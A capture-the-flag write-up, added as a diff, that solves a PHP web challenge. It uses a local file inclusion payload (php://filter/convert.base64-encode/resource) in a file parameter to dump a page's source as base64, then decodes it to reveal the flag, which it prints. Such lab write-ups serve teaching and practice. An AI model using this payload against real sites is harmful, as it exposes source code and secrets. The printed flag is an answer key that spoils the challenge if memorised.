@@ -1,0 +1,61 @@
+Challenge description:
+The Dark Army said that the previous link was just a test! There's supposedly something more important at http://web.spro.ink:3005/home.php.
+
+Prerequisite skills:
+Ability to exploit local file inclusion vulnerabilities
+
+========================================================
+Just like in challenge 5, we tried to do directing listing again.
+
+Index of /
+Name		Last modified		Size	Description
+1.gif		2016-08-17 13:18 	7.3M	 
+1.php		2016-08-17 13:18 	18 	 
+2.gif		2016-08-17 13:18 	903K	 
+2.php		2016-08-17 13:18 	18 	 
+3.gif		2016-08-17 13:18 	347K	 
+3.php		2016-08-17 13:18 	18 	 
+home.php	2016-08-17 13:18 	392 	 
+secret.php	2016-08-17 13:18 	120 	 
+------------------------------------------------------
+Apache/2.4.7 (Ubuntu) Server at web.spro.ink Port 3005
+
+========================================================
+We attempted the same technique in challenge 5. However, this is not so straight forward. We have to get the php source file to look at the comments!
+========================================================
+http://web.spro.ink:3005/home.php?file=secret
+
+More advanced lulz (that you might not get)!
+
+-    Dogssssssssssssss
+-    Emails!
+-    Processing an infinite loop... 
+
+Not so easy this time! The flag is commented out :) 
+
+========================================================
+Google local file inclusion php filter
+
+and we get this line of code from https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/ which spews out source file in base64.
+
+	php://filter/convert.base64-encode/resource
+========================================================
+After reading up on how to use the code, we slot the code into the file parameter as shown.
+========================================================
+http://web.spro.ink:3005/home.php?file=php://filter/convert.base64-encode/resource=secret
+
+More advanced lulz (that you might not get)!
+
+    Dogssssssssssssss
+    Emails!
+    Processing an infinite loop... 
+
+PD9waHAKLy8gZmxhZ3tzMW5jM193aDNuX2QwX2YxbHQzcjVfcHIwZHVjM19tMHIzXzU3dWZmP30KZWNobyAiTm90IHNvIGVhc3kgdGhpcyB0aW1lISBUaGUgZmxhZyBpcyBjb21tZW50ZWQgb3V0IDopIjsKPz4K 
+=========================================================
+Use https://www.base64decode.org/ to decode base64 and we get the flag!
+
+=========================================================
+<?php
+// flag{s1nc3_wh3n_d0_f1lt3r5_pr0duc3_m0r3_57uff?}
+echo "Not so easy this time! The flag is commented out :)";
+?>
